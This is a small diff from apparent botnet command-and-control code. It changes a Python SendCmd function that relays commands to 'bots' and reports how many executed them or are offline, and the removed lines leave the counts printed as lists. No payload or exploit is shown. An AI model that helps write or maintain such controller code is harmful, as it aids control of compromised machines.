@@ -73,8 +73,6 @@ def SendCmd(cmd,so,rlock):#Send Commands Module
 		th_list.append(th)
 	for th in th_list:
 		th.join()
-	count = len(count)
-	dead = len(dead)
 	print("[!] "+str(dead)+" bots offline")
 	print(str(count)+" bots got the command")
 	so.send((str(count)+" bots exec the command\r\n").encode())
